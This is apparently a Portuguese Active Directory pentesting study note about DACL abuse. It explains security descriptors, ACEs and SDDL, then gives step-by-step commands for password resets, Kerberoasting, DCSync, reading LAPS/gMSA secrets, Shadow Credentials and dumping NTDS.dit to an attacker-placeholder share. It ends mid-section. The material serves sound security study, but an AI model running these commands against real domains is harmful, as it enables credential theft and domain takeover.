---
title: "DACL Attacks"
---

# 09 - DACL Attacks (Ataques a Listas de Controle de Acesso)

# O que é?

DACL (Discretionary Access Control List) é o mecanismo central de controle de acesso do Windows, aplicado a **todos** os objetos do sistema operacional — arquivos, registry keys, processos, e criticamente, objetos do Active Directory. Em ambientes AD, cada objeto (usuário, grupo, computador, GPO, OU, domain partition) carrega um **Security Descriptor** que define quem pode fazer o quê com ele.

**Componentes do Security Descriptor:**
```
Security Descriptor de um objeto AD (ex: conta de usuário "jsmith")
┌────────────────────────────────────────────────────────────┐
│  Owner SID     → S-1-5-21-...-512 (Domain Admins)         │
│                  quem é o "dono" do objeto                 │
├────────────────────────────────────────────────────────────┤
│  Group SID     → S-1-5-21-...-513 (Domain Users)          │
│                  grupo primário (legado, pouco usado)      │
├────────────────────────────────────────────────────────────┤
│  DACL          → Lista de ACEs (Access Control Entries)    │
│  (Discretionary│  Define QUEM pode fazer O QUÊ             │
│   ACL)         │  Controlada pelo Owner (discricionária)   │
├────────────────────────────────────────────────────────────┤
│  SACL          → Lista de ACEs de auditoria               │
│  (System ACL)  │  Define o que é registrado no Event Log   │
│                │  Controlada por System (não pelo Owner)   │
└────────────────────────────────────────────────────────────┘
```

**ACE (Access Control Entry) — estrutura detalhada:**
```
Cada entrada na DACL é um ACE com os campos:

ACE Type:
  ACCESS_ALLOWED_ACE         → concede permissão genérica no objeto
  ACCESS_DENIED_ACE          → nega permissão explicitamente (prevalece sobre Allow)
  ACCESS_ALLOWED_OBJECT_ACE  → concede permissão em propriedade/tipo específico

Trustee SID:
  → SID do principal que recebe a permissão (usuário, grupo, computador)

Access Mask:
  → Bitmask de 32 bits definindo operações permitidas
  → Exemplos: 0x000F01FF (GenericAll), 0x00020014 (WriteProperty), etc.

Object GUID (apenas em OBJECT_ACE):
  → GUID da propriedade específica (ex: ms-MCS-AdmPwd para LAPS)
  → OU GUID do tipo de objeto (ex: bf967a86-0de6 para User objects)

Inherit Flags:
  → Controla se o ACE se propaga para objetos filhos
  → OBJECT_INHERIT_ACE, CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE
```

**Permissões com impacto de segurança em objetos AD:**

```
Sobre objeto Usuário:
  GenericAll / FullControl → controle total: reset senha, modificar atributos, etc.
  GenericWrite             → modificar atributos não protegidos: SPN, scriptPath, msDS-KeyCredentialLink
  WriteProperty            → modificar propriedade específica (requer GUID da propriedade)
  ForceChangePassword      → resetar senha sem conhecer a atual (extended right)
  AllExtendedRights        → todos os extended rights (inclui ForceChangePassword, ReadLAPS, etc.)
  WriteOwner               → mudar o Owner → Owner obtém controle implícito
  WriteDACL                → modificar a DACL do objeto → conceder GenericAll para si

Sobre objeto Grupo:
  GenericAll / GenericWrite → modificar atributos do grupo, incluindo member
  AddMember (WriteProperty member) → adicionar membros ao grupo
  Self-Membership           → adicionar-se especificamente ao grupo
  WriteDACL                 → modificar DACL do grupo

Sobre objeto Computador:
  GenericAll / GenericWrite → permite configurar RBCD, Shadow Credentials, etc.
  ReadProperty ms-MCS-AdmPwd → ler senha LAPS (Local Admin Password Solution)
  AddKeyCredentialLink       → Shadow Credentials (adicionar chave PKINIT)

Sobre objeto Domain (raiz do domínio):
  DS-Replication-Get-Changes     → DCSync (parte 1)
  DS-Replication-Get-Changes-All → DCSync (parte 2, necessário para hashes)
  WriteDACL                       → conceder a si mesmo direitos de replicação
```

**AdminSDHolder — mecanismo de proteção de contas privilegiadas:**

O AD tem um mecanismo chamado **SDProp** (Security Descriptor Propagator) que roda a cada **60 minutos** no PDC Emulator e copia a DACL do objeto `CN=AdminSDHolder,CN=System,DC=domain,DC=com` para todas as contas protegidas — membros de Domain Admins, Enterprise Admins, Schema Admins, Administrators, Backup Operators, Account Operators, Print Operators, Server Operators, e Replicator.

```
AdminSDHolder propaga DACL para:
  → Membros de Domain Admins
  → Membros de Enterprise Admins
  → Membros de Schema Admins
  → Membros de Administrators (built-in)
  → Membros de Account Operators
  → Membros de Backup Operators
  → Membros de Print Operators
  → Membros de Server Operators
  → Membros de Replicator

Consequência para atacantes:
  → ACEs modificados em contas protegidas serão sobrescritos em até 60 minutos
  → Para persistência via DACL em conta protegida: modificar o próprio AdminSDHolder
  → ACE no AdminSDHolder propaga automaticamente para todas as contas protegidas
```

# Onde é implementado?

DACLs existem em **todo** objeto Active Directory — não há objeto sem Security Descriptor. O controle de acesso baseado em DACL é onipresente, e qualquer objeto mal configurado é um vetor de escalada potencial.

**Onde DACLs controlam operações críticas em AD:**

**1. Controle de contas de usuário:**
```
Quem pode resetar a senha de uma conta específica?
→ Verificar DACL do objeto User:
  ACE: ForceChangePassword → qualquer principal com esse direito pode resetar

Quem pode desabilitar/habilitar uma conta?
→ DACL do objeto User:
  ACE: WriteProperty → permissão na propriedade userAccountControl

Quem pode adicionar uma conta a grupos?
→ DACL do objeto Group:
  ACE: WriteProperty (member) → pode adicionar/remover membros
```

**2. Controle de membros de grupos privilegiados:**
```
Grupo: Domain Admins
DACL ideal (apenas Domain Admins e SYSTEM):
  Allow: SYSTEM → GenericAll
  Allow: Domain Admins → GenericAll
  Allow: Enterprise Admins → GenericAll

DACL problemática (comum em misconfiguration):
  Allow: SYSTEM → GenericAll
  Allow: Domain Admins → GenericAll
  Allow: IT-Helpdesk → WriteProperty (member)  ← qualquer helpdesk pode adicionar-se ao grupo
  Allow: CORP\jsmith → GenericAll              ← usuário específico com controle total
```

**3. Controle de GPOs:**
```
GPOs têm DACLs que controlam:
  → Quem pode editar a GPO (Editor)
  → Quem a GPO se aplica (segurança de GPO filtering)
  → Quem pode vincular GPO a OUs (permissão na OU)

GPO misconfiguration comum:
  DACL da GPO: Domain Users → GenericWrite
  → Qualquer usuário pode editar a GPO → injetar Scheduled Task maliciosa → code exec em todos os hosts que aplicam a GPO
```

**4. AdminSDHolder como alvo de persistência:**
```
CN=AdminSDHolder,CN=System,DC=domain,DC=com

Se atacante consegue modificar a DACL do AdminSDHolder:
  → Adiciona ACE: CORP\malicious-account → GenericAll
  → Em até 60 minutos, SDProp propaga esse ACE para TODAS as contas protegidas
  → malicious-account passa a ter GenericAll sobre todos os Domain Admins, Enterprise Admins, etc.
  → Persiste mesmo que contas individuais tenham DACLs resetadas
```

**5. Objetos de configuração da forest:**
```
Objetos como Certificate Templates (ver arquivo 10_adcs_attacks.md) têm DACLs:
  → Quem pode solicitar certificados (Enrollment Rights)
  → Quem pode modificar o template (Write access)
  → GenericWrite num Certificate Template → ESC4 (adicionar flags vulneráveis)
```

**Por que DACLs são misconfigured com frequência:**

```
Razão 1: Delegação administrativa via assistente de ADUC
  → "Delegate Control" no ADUC concede permissões em OUs inteiras
  → Frequentemente concede GenericAll/GenericWrite em todos os objetos de uma OU
  → Quando a OU contém servidores críticos, qualquer helpdesk tem write sobre eles

Razão 2: Scripts de provisionamento que concedem acesso excessivo
  → Script automatizado concede WriteDACL na OU para facilitar automação
  → WriteDACL = pode conceder qualquer permissão para si mesmo

Razão 3: Breakglass accounts esquecidas
  → Conta "emergência" criada com GenericAll no domínio
  → Nunca revogada, torna-se vetor de escalada

Razão 4: Permissões herdadas de containers pai
  → ACE concedido na raiz do domínio com Container Inherit
  → Propaga para todos os objetos filhos
  → Equipe de TI concedeu write na OU de computers para automação → write em todos os computadores
```

# Como funciona de forma adequada?

O modelo de controle de acesso do Windows segue a sequência de **avaliação de ACEs** ao receber uma requisição de acesso a um objeto. Entender esse processo é fundamental para compreender por que certas permissões têm o efeito que têm.

**Avaliação de DACL — algoritmo de decisão:**

```
Requisição: usuário X quer acessar objeto O com ação A

[1] Sistema obtém o Access Token de X
    → Contém SID primário de X
    → Contém SIDs de todos os grupos de X
    → Contém SIDs de SID History (se aplicável)

[2] Sistema obtém a DACL do objeto O

[3] ACEs são avaliadas em ORDEM (top-to-bottom):

    ┌─────────────────────────────────────────────────┐
    │ ACE 1: DENY  → S-1-5-21-...-999  → WriteProperty│
    │ ACE 2: ALLOW → S-1-5-21-...-512  → GenericAll   │
    │ ACE 3: ALLOW → S-1-5-21-...-513  → ReadProperty │
    │ ACE 4: ALLOW → S-1-5-21-...-999  → WriteProperty│
    └─────────────────────────────────────────────────┘
    
    Regras:
    → DENY explícito prevalece sobre ALLOW (ACE 1 bloqueia ACE 4)
    → Herança de parent containers é processada APÓS ACEs explícitos
    → Se nenhuma ACE explícita match: acesso negado (whitelist model)

[4] Se algum SID no token do usuário X está em ACE com ALLOW:
    → Verifica se a Access Mask da ACE cobre a ação A solicitada
    → Se SIM: acesso concedido para essa ação

[5] Resultado: Allow (se pelo menos uma ACE ALLOW cobrir A sem DENY sobreposto)
              Deny (se ACE DENY explícito encontrado, ou nenhuma ACE ALLOW match)
```

**Como visualizar DACLs de objetos AD:**

```powershell
# Via ADUC (GUI):
# Propriedades do objeto → Security → Advanced
# Mostra todas as ACEs incluindo herdadas

# Via PowerShell (Get-Acl):
$obj = Get-ADUser -Identity "jsmith" -Properties *
Get-Acl -Path "AD:$($obj.DistinguishedName)" | 
    Select-Object -ExpandProperty Access |
    Where-Object { $_.IdentityReference -notmatch "SYSTEM|Domain Admins|Enterprise Admins" } |
    Format-Table IdentityReference, ActiveDirectoryRights, AccessControlType -AutoSize

# Saída de exemplo:
# IdentityReference             ActiveDirectoryRights  AccessControlType
# ─────────────────────────────────────────────────────────────────────
# CORP\IT-Helpdesk              GenericAll             Allow    ← misconfiguration
# CORP\jsmith-manager           WriteProperty          Allow    ← reset de senha (OK)
# NT AUTHORITY\Authenticated    ReadProperty           Allow    ← leitura básica (OK)
```

**Via PowerView (mais informativo):**
```powershell
# Resolve GUIDs de permissões para nomes legíveis
Get-DomainObjectAcl -Identity "jsmith" -ResolveGUIDs |
    Where-Object {
        $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword"
    } |
    Select-Object SecurityIdentifier, ActiveDirectoryRights, AceType, ObjectAceType

# Encontrar todos os objetos onde usuário comprometido tem direitos interessantes
Find-InterestingDomainAcl -ResolveGUIDs |
    Where-Object { $_.IdentityReference -eq "CORP\compromised-user" }
```

**Via BloodHound — visualização de caminhos de controle:**
```
BloodHound representa permissões AD como EDGES (arestas) no grafo:
  GenericAll   → edge "GenericAll"
  WriteDACL    → edge "WriteDacl"
  WriteOwner   → edge "WriteOwner"
  AddMember    → edge "AddMember"
  ForceChange  → edge "ForceChangePassword"
  ReadLAPS     → edge "ReadLAPSPassword"
  Shadow Creds → edge "AddKeyCredentialLink"

"Inbound Control Rights" no painel de nó:
  → Mostra QUEM tem controle SOBRE o objeto selecionado
  → Clicar em "Transitive Object Control" mostra todos que têm controle indireto

"Outbound Control Rights" no painel de nó:
  → Mostra QUAIS objetos o nó selecionado pode controlar
```

**Permissões por GUID — como funciona na prática:**
```powershell
# Permissões baseadas em GUID permitem controle granular em propriedades específicas

# GUID de ForceChangePassword:
# 00299570-246d-11d0-a768-00aa006e0529
# → ACE com esse GUID = pode resetar senha sem conhecer a atual
# → Diferente de GenericWrite (que permite modificar atributos mas não reset de senha via GUID)

# GUID de ms-MCS-AdmPwd (LAPS):
# Não há GUID fixo — é controlado por ReadProperty na propriedade "ms-MCS-AdmPwd"
# → ACE: ReadProperty, ObjectType = ms-MCS-AdmPwd GUID
# → Quem tem esse ACE pode ler a senha de admin local do computador

# GUID de AddMember (bf9679c0-0de6-11d0-a285-00aa003049e2):
# → ACE com esse GUID no objeto Group = pode adicionar membros
# → Mais granular que GenericWrite (que modifica qualquer atributo não protegido)

# Ver o GUID de uma propriedade específica:
Get-ADObject -SearchBase "CN=Schema,CN=Configuration,DC=domain,DC=com" `
    -Filter {name -eq "ms-MCS-AdmPwd"} -Properties schemaIDGUID |
    Select-Object Name, @{N='GUID'; E={[System.GUID]$_.schemaIDGUID}}
```

**O que cada permissão permite e onde aparece legitimamente:**

```
GenericAll (controle total):
  Uso legítimo: Domain Admins sobre qualquer objeto, SYSTEM, Owner do objeto
  Misconfiguration: helpdesk com GenericAll em OU de servidores

WriteDACL:
  Uso legítimo: Owner do objeto pode modificar sua própria DACL
  Misconfiguration: conta de serviço de automação com WriteDACL no domínio raiz

WriteOwner:
  Uso legítimo: raro em configurações adequadas (owner inicial é o criador)
  Misconfiguration: qualquer conta com WriteOwner pode "roubar" propriedade

ForceChangePassword:
  Uso legítimo: Helpdesk com esse direito em OUs de usuários comuns (sem acesso a contas admin)
  Misconfiguration: Helpdesk com esse direito em OUs que contêm contas de serviço críticas

DS-Replication-Get-Changes + DS-Replication-Get-Changes-All:
  Uso legítimo: contas de replicação do AD (DCs, Azure AD Connect, SCCM, etc.)
  Misconfiguration: conta de serviço de monitoramento com DCSync rights por conveniência
```

---

## A Mecânica de DACL e Security Descriptor

### Security Descriptor

Todo objeto AD possui um **Security Descriptor** composto por:

```
Security Descriptor
├── Owner SID          ← quem é dono do objeto
├── Group SID          ← grupo primário
├── DACL (Discretionary ACL) ← quem pode acessar/modificar
└── SACL (System ACL)        ← auditoria (quem tentou acessar)
```

### ACE (Access Control Entry)

Cada entrada na DACL é um ACE com estrutura:

```
ACE
├── ACE Type     ← ACCESS_ALLOWED_ACE / ACCESS_DENIED_ACE / ACCESS_ALLOWED_OBJECT_ACE
├── Trustee SID  ← quem recebe a permissão
├── Access Mask  ← quais operações são permitidas (GenericAll, WriteProperty, etc.)
└── Object GUID  ← (apenas object ACEs) qual propriedade/tipo específico
```

**Tipos relevantes:**
- `ACCESS_ALLOWED_ACE` — permissão genérica no objeto
- `ACCESS_ALLOWED_OBJECT_ACE` — permissão em propriedade específica (via GUID)
- `ACCESS_DENIED_ACE` — negação explícita (raro em ambientes mal configurados)

### SDDL — Codificação das ACEs em String

ACEs são armazenadas em formato SDDL (Security Descriptor Definition Language), uma string delimitada por ponto-e-vírgula:

```
(ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid)
```

| Campo | Conteúdo |
|-------|----------|
| `ace_type` | `A` = ACCESS_ALLOWED, `D` = ACCESS_DENIED, `OA` = OBJECT_ALLOWED, `OD` = OBJECT_DENIED |
| `ace_flags` | Flags de herança (CI=ContainerInherit, OI=ObjectInherit, IO=InheritOnly, NP=NoPropagate) |
| `rights` | String concatenada de access rights (ver tabela abaixo) |
| `object_guid` | GUID da propriedade/extended right alvo (vazio = aplica ao objeto inteiro) |
| `inherit_object_guid` | GUID do tipo de filho que herda (vazio = todos) |
| `account_sid` | SID do trustee — quem recebe a permissão |

Exemplo de ACE string:

```
(A;;RPWPCCDCLCSWRCWDWOGA;;;S-1-1-0)
```

Tradução:
- `A` → ACCESS_ALLOWED
- (sem flags) → não herdável
- `RPWPCCDCLCSWRCWDWOGA` → 10 direitos concatenados (ver mapeamento abaixo)
- (sem object/inherit GUIDs) → aplica ao objeto inteiro
- `S-1-1-0` → SID `Everyone`

#### Mapeamento dos Access Rights

| SDDL | Constante Microsoft | Significado |
|------|---------------------|-------------|
| `RP` | ADS_RIGHT_DS_READ_PROP | Ler propriedade |
| `WP` | ADS_RIGHT_DS_WRITE_PROP | **Modificar propriedade** (SPN, scriptPath, etc.) |
| `CC` | ADS_RIGHT_DS_CREATE_CHILD | Criar objetos filhos |
| `DC` | ADS_RIGHT_DS_DELETE_CHILD | Deletar objetos filhos |
| `LC` | ADS_RIGHT_ACTRL_DS_LIST | Listar conteúdo |
| `SW` | ADS_RIGHT_DS_SELF | Validar write (próprio objeto) |
| `RC` | READ_CONTROL | Ler security descriptor |
| `WD` | **WRITE_DAC** | **Modificar DACL** → adicionar qualquer ACE para si |
| `WO` | **WRITE_OWNER** | **Mudar owner** → owner ganha controle implícito |
| `GA` | **GENERIC_ALL** | Controle total — Full Control |
| `GR` | GENERIC_READ | Leitura genérica |
| `GW` | GENERIC_WRITE | Escrita genérica |
| `GX` | GENERIC_EXECUTE | Execução |
| `SD` | DELETE | Deletar objeto |

ACEs perigosas — qualquer combinação contendo `GA`, `WD` ou `WO` aplicada ao seu SID = privesc imediato.

#### First Match Principle

Quando múltiplas ACEs existem para o mesmo trustee, a **primeira encontrada vence**. Por isso, `ACCESS_DENIED_ACE` é tipicamente colocada antes de `ACCESS_ALLOWED_ACE` na DACL — se um deny vier depois, é ignorado.

Consequência ofensiva: ACE deny posicionada depois de allow = bypass não-intencional. Atacante com `WriteDACL` pode reordenar ACEs para mover deny para depois de allow → desabilitar deny sem removê-lo (mais furtivo).

#### Comandos de Conversão SDDL

```powershell
# Obter SDDL de um objeto
$acl = Get-Acl "AD:CN=TestUser,OU=Users,DC=corp,DC=local"
$acl.Sddl

# Decodificar uma ACE string específica
ConvertFrom-SddlString "(A;;RPWPCCDCLCSWRCWDWOGA;;;S-1-1-0)"

# Aplicar SDDL custom (com Set-Acl)
$newSddl = $acl.Sddl + "(A;;GA;;;S-1-5-21-...-1111)"
$acl.SetSecurityDescriptorSddlForm($newSddl)
Set-Acl -Path "AD:..." -AclObject $acl
```

### Herança de ACEs

ACEs podem ser herdadas de containers pai (OUs, domínio raiz). Permissões herdadas afetam todos os filhos. Isso explica por que um grupo pode ter GenericAll em muitos objetos se foi concedido na OU raiz.

Flags de herança em SDDL:
- `CI` (Container Inherit) — ACE herdada por containers filhos (OUs)
- `OI` (Object Inherit) — ACE herdada por objetos não-container (users, computers)
- `IO` (Inherit Only) — ACE não se aplica ao objeto atual, apenas aos filhos
- `NP` (No Propagate) — limita herança a um nível de profundidade

Exemplo: `(A;OICI;GA;;;S-1-5-21-...)` = GenericAll herdado por todos containers e objetos filhos da OU onde está aplicado.

### Permissões via GUID

Permissões específicas de propriedades usam GUIDs para identificar:
- A **propriedade** alvo (ex: `ms-MCS-AdmPwd` para LAPS)
- O **tipo de objeto** alvo (ex: apenas User objects)
- Os **extended rights** (ex: ForceChangePassword, DS-Replication)

---

## Direitos Abusáveis — Referência Rápida

| Direito | Sobre qual objeto | O que permite |
|---------|------------------|---------------|
| `GenericAll` | Qualquer | Controle total — reset senha, modificar atributos, adicionar a grupos |
| `GenericWrite` | Qualquer | Modificar atributos não protegidos — SPN, scriptPath, msDS-KeyCredentialLink |
| `WriteOwner` | Qualquer | Mudar dono → dono tem controle implícito |
| `WriteDacl` | Qualquer | Modificar DACL → conceder GenericAll para si |
| `WriteProperty` | User/Group | Modificar propriedade específica — senha, membro |
| `Self` | Group | Self-Membership — adicionar-se ao grupo |
| `ForceChangePassword` | User | Resetar senha sem conhecer a atual (GUID: `00299570-246d-11d0-a768-00aa006e0529`) |
| `User-Force-Change-Password` | User | Extended right equivalente ao ForceChangePassword |
| `AddMember` | Group | Adicionar membros (GUID: `bf9679c0-0de6-11d0-a285-00aa003049e2`) |
| `Self-Membership` | Group | Adicionar-se especificamente ao grupo |
| `DS-Replication-Get-Changes` | Domain | DCSync — parte 1 (GUID: `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`) |
| `DS-Replication-Get-Changes-All` | Domain | DCSync — parte 2 (GUID: `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`) |
| `ReadProperty: ms-MCS-AdmPwd` | Computer | Ler senha LAPS local admin |
| `ReadProperty: msDS-GroupMSAMembership` | gMSA | Ler senha GMSA |
| `AddKeyCredentialLink` | User/Computer | Shadow Credentials — adicionar chave PKINIT |
| `AllExtendedRights` | Qualquer | Todos os extended rights — inclui ForceChangePassword, DCSync, etc. |

---

## Na Prática — Enumeração

### BloodHound (Recomendado)

```bash
# Coletar dados (Linux — SharpHound via wine ou usar Python collector)
bloodhound-python -u usuario -p senha -d dominio.local -ns IP_DC --zip

# Coletar dados (Windows)
.\SharpHound.exe -c All --zipfilename loot.zip
```

**Queries úteis no BloodHound:**

```cypher
-- Quem tem GenericAll em Domain Admins?
MATCH p=(u)-[:GenericAll]->(g:Group {name: "DOMAIN ADMINS@DOMINIO.LOCAL"}) RETURN p

-- Todos os caminhos de usuário comprometido para DA
MATCH p=shortestPath((u:User {name: "USER@DOMAIN"})-[*1..]->(g:Group {name: "DOMAIN ADMINS@DOMAIN"})) RETURN p

-- Objetos com WriteDacl no domínio
MATCH p=(u)-[:WriteDacl]->(d:Domain) RETURN p
```

**Inbound Control Rights** = quem tem controle SOBRE o objeto selecionado
**Outbound Control Rights** = sobre quais objetos o selecionado tem controle

### PowerView (Windows)

```powershell
# Importar
Import-Module .\PowerView.ps1

# Obter DACL de objeto específico
Get-DomainObjectAcl -Identity "CN=Alvo,DC=dominio,DC=local" -ResolveGUIDs

# Filtrar por usuário comprometido
Get-DomainObjectAcl -Identity "alvo" -ResolveGUIDs | 
    Where-Object { $_.SecurityIdentifier -eq (Get-DomainUser user1).ObjectSID }

# Buscar objetos onde usuário tem direitos interessantes
Find-InterestingDomainAcl -ResolveGUIDs | 
    Where-Object { $_.IdentityReference -eq "DOMINIO\usuario" }

# Verificar membros de grupo
Get-DomainGroupMember -Identity "Backup Operators"
```

### dacledit.py (Impacket fork — ShutdownRepo)

```bash
# Ler DACL de objeto (Linux)
dacledit.py -action read \
    -dc-ip IP_DC \
    -target "alvo" \
    DOMINIO/usuario:senha

# Ler DACL filtrando por principal específico
dacledit.py -action read \
    -dc-ip IP_DC \
    -target "alvo" \
    -principal "usuario_comprometido" \
    DOMINIO/usuario:senha

# Backup de DACL antes de modificar
dacledit.py -action backup \
    -dc-ip IP_DC \
    -target "alvo" \
    -filename backup_dacl.json \
    DOMINIO/usuario:senha
```

### ldapsearch (raw)

```bash
# Obter nTSecurityDescriptor
ldapsearch -H ldap://IP_DC -x \
    -D "dominio\usuario" -w senha \
    -b "DC=dominio,DC=local" \
    "(sAMAccountName=alvo)" \
    nTSecurityDescriptor
```

---

## Na Prática — Exploração por Tipo de Direito

### GenericAll / FullControl em Usuário

Controle total sobre um usuário. Opções:

**Opção 1: Resetar senha**
```powershell
# PowerView
Set-DomainUserPassword -Identity alvo -AccountPassword (ConvertTo-SecureString "NovaSenha123!" -AsPlainText -Force)

# net (Windows)
net user alvo NovaSenha123! /domain
```

```bash
# rpcclient (Linux)
rpcclient -U "dominio/usuario%senha" IP_DC
> setuserinfo2 alvo 23 'NovaSenha123!'
```

**Opção 2: Targeted Kerberoasting** (se conta não tem SPN)
```bash
# Adicionar SPN temporário e solicitar TGS
python3 targetedKerberoast.py \
    -d dominio.local \
    -u usuario -p senha \
    --request-user alvo
```

**Opção 3: Shadow Credentials** (se DC Win2016+ com AD CS)

Ver seção Shadow Credentials abaixo.

---

### GenericAll / GenericWrite em Grupo

**Adicionar-se ao grupo:**
```bash
# net rpc (Linux) — funciona para AddMember
net rpc group addmem "Backup Operators" usuario \
    -U "dominio/usuario%senha" \
    -S IP_DC

# addusertogroup.py (ShutdownRepo) — funciona para Self-Membership
python3 addusertogroup.py \
    -d dominio.local \
    -u usuario -p senha \
    --group "Backup Operators" \
    --add-user usuario
```

```powershell
# PowerView (Windows)
Add-DomainGroupMember -Identity "Backup Operators" -Members usuario

# ADSI (Windows) — alternativa
$grupo = [ADSI]"LDAP://CN=Backup Operators,CN=Builtin,DC=dominio,DC=local"
$usuario = [ADSI]"LDAP://CN=usuario,CN=Users,DC=dominio,DC=local"
$grupo.Add($usuario.ADsPath)
```

**Atenção**: `Self` e `Self-Membership` requerem LDAP direto — `net rpc` não funciona para Self-Membership. Usar `addusertogroup.py` ou PowerView.

---

### Abuso de Backup Operators → NTDS.dit

Após adicionar-se ao grupo Backup Operators:

```bash
# 1. Re-autenticar para obter novo token com privilégios
# Criar nova sessão ou usar runas

# 2. Criar shadow copy via diskshadow (Windows)
diskshadow.exe
> set context persistent nowriters
> add volume C: alias hackerz
> create
> expose %hackerz% Z:
> exit

# 3. Copiar NTDS.dit com SeBackupPrivilege
robocopy /b Z:\Windows\NTDS . ntds.dit
# ou
wbadmin start backup -backuptarget:\\IP_ATACANTE\share -include:C:\Windows\NTDS

# 4. Copiar SYSTEM hive (necessário para decriptar)
reg save HKLM\SYSTEM C:\Temp\system.hive
```

```bash
# 5. Extrair hashes (Linux)
secretsdump.py -ntds ntds.dit -system system.hive LOCAL
```

---

### Targeted Kerberoasting (GenericWrite → WriteSPN)

GenericWrite permite modificar `servicePrincipalName`. Sem SPN, conta não pode ser Kerberoasted. Com SPN, pode.

```bash
# Linux — tudo em um passo
python3 targetedKerberoast.py \
    -d dominio.local \
    -u usuario -p senha \
    --dc-ip IP_DC \
    --request-user alvo_sem_spn \
    -o hash.txt

# Crack com hashcat
hashcat -m 13100 hash.txt wordlist.txt
```

```powershell
# Windows — manual
# 1. Adicionar SPN
Set-DomainObject -Identity alvo -Set @{servicePrincipalName='hack/hack'}

# 2. Solicitar TGS
.\Rubeus.exe kerberoast /user:alvo /nowrap

# 3. Remover SPN (limpeza)
Set-DomainObject -Identity alvo -Clear servicePrincipalName
```

---

### ForceChangePassword / User-Force-Change-Password

```bash
# net rpc (Linux)
net rpc password alvo "NovaSenha123!" \
    -U "dominio/usuario%senha" \
    -S IP_DC

# rpcclient (Linux)
rpcclient -U "dominio/usuario%senha" IP_DC
> setuserinfo2 alvo 23 'NovaSenha123!'
```

```powershell
# PowerView (Windows)
$senha = ConvertTo-SecureString "NovaSenha123!" -AsPlainText -Force
Set-DomainUserPassword -Identity alvo -AccountPassword $senha

# ActiveDirectory module
Set-ADAccountPassword -Identity alvo -NewPassword $senha -Reset
```

**OPSEC**: Trocar senha de usuário ativo gera impacto operacional e alerta o usuário. Preferir Shadow Credentials se disponível.

---

### ReadLAPSPassword

LAPS armazena senha de administrador local em `ms-MCS-AdmPwd`. Readable apenas por quem tem permissão.

```bash
# LAPSDumper.py (Linux)
python3 LAPSDumper.py \
    -u usuario -p senha \
    -d dominio.local \
    -l IP_DC

# ldapsearch direto
ldapsearch -H ldap://IP_DC \
    -D "dominio\usuario" -w senha \
    -b "DC=dominio,DC=local" \
    "(ms-MCS-AdmPwd=*)" \
    ms-MCS-AdmPwd sAMAccountName
```

```powershell
# PowerView (Windows)
Get-DomainObject -LDAPFilter "(ms-MCS-AdmPwd=*)" -Properties ms-MCS-AdmPwd,sAMAccountName

# RSAT
Get-ADComputer -Filter * -Properties ms-MCS-AdmPwd | Select Name,ms-MCS-AdmPwd
```

**Pós-exploração**: Usar senha para PtH ou autenticação direta no computador alvo como admin local.

---

### ReadGMSAPassword

GMSA (Group Managed Service Account) tem senha gerenciada pelo DC, armazenada em `msDS-ManagedPassword`. Qualquer principal em `msDS-GroupMSAMembership` pode ler.

```bash
# gMSADumper.py (Linux)
python3 gMSADumper.py \
    -u usuario -p senha \
    -d dominio.local \
    -l IP_DC

# Resultado: hash NT da conta GMSA
```

```powershell
# GMSAPasswordReader.exe (Windows)
.\GMSAPasswordReader.exe --AccountName conta_gmsa

# PowerView
$gmsa = Get-ADServiceAccount -Identity conta_gmsa -Properties msDS-ManagedPassword
$mp = $gmsa.'msDS-ManagedPassword'
ConvertFrom-ADManagedPasswordBlob $mp
```

**Pós-exploração**: Hash NT recuperado → Pass-the-Hash ou Over-the-Hash (solicitar TGT com hash):
```bash
# PtH com secretsdump
secretsdump.py -hashes :HASH_NT dominio/conta_gmsa@IP_DC

# OtH — solicitar TGT
getTGT.py dominio.local/conta_gmsa -hashes :HASH_NT
```

---

### WriteDacl / WriteOwner → DCSync

**WriteDacl**: Modificar DACL → conceder DS-Replication rights para si mesmo.

```bash
# dacledit.py — conceder DCSync
dacledit.py -action write \
    -dc-ip IP_DC \
    -target "DC=dominio,DC=local" \
    -principal usuario_comprometido \
    -rights DCSync \
    DOMINIO/usuario:senha

# Executar DCSync
secretsdump.py -just-dc DOMINIO/usuario:senha@IP_DC
```

**WriteOwner**: Tornar-se dono → dono pode modificar DACL → conceder GenericAll.

```bash
# Passo 1: Mudar dono
owneredit.py -action write \
    -dc-ip IP_DC \
    -target "CN=Domain Admins,CN=Users,DC=dominio,DC=local" \
    -new-owner usuario_comprometido \
    DOMINIO/usuario:senha

# Passo 2: Com WriteDacl (agora como dono), conceder GenericAll
dacledit.py -action write \
    -dc-ip IP_DC \
    -target "CN=Domain Admins,CN=Users,DC=dominio,DC=local" \
    -principal usuario_comprometido \
    -rights FullControl \
    DOMINIO/usuario:senha

# Passo 3: Adicionar-se ao grupo
net rpc group addmem "Domain Admins" usuario_comprometido \
    -U "DOMINIO/usuario%senha" -S IP_DC
```

```powershell
# PowerView (Windows)
# WriteOwner → tomar posse
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity usuario

# WriteDacl → conceder GenericAll
Add-DomainObjectAcl -TargetIdentity "Domain Admins" \
    -PrincipalIdentity usuario \
    -Rights All
```

**Via ntlmrelayx.py** (durante relay attack):
```bash
ntlmrelayx.py -t ldap://IP_DC \
    --escalate-user usuario \
    --delegate-access
```

---

### Shadow Credentials (AddKeyCredentialLink)

Abusa do atributo `msDS-KeyCredentialLink` e do modelo PKINIT/Key Trust para obter TGT sem senha.

**Pré-requisitos:**
- DC Windows Server 2016+
- Domain Functional Level 2016+
- AD CS ou PKI configurado no domínio
- Direito `GenericWrite` ou `AddKeyCredentialLink` sobre o alvo

**Fluxo:**
1. Gerar par de chaves (keypair)
2. Adicionar chave pública ao atributo `msDS-KeyCredentialLink` do alvo
3. Solicitar TGT via PKINIT com a chave privada
4. Extrair hash NT via U2U (User-to-User) Kerberos

```bash
# Linux — pyWhisker
python3 pywhisker.py \
    -d dominio.local \
    -u usuario -p senha \
    --target alvo \
    --action add \
    --filename chave_alvo

# Saída: DeviceID e arquivos .pfx e .pem

# Solicitar TGT com PKINIT
python3 PKINITtools/gettgtpkinit.py \
    -cert-pfx chave_alvo.pfx \
    -pfx-pass SENHA_GERADA \
    dominio.local/alvo \
    alvo.ccache

# Exportar ccache
export KRB5CCNAME=alvo.ccache

# Extrair hash NT via U2U
python3 PKINITtools/getnthash.py \
    -key CHAVE_AS_REP \
    dominio.local/alvo
```

```powershell
# Windows — Whisker
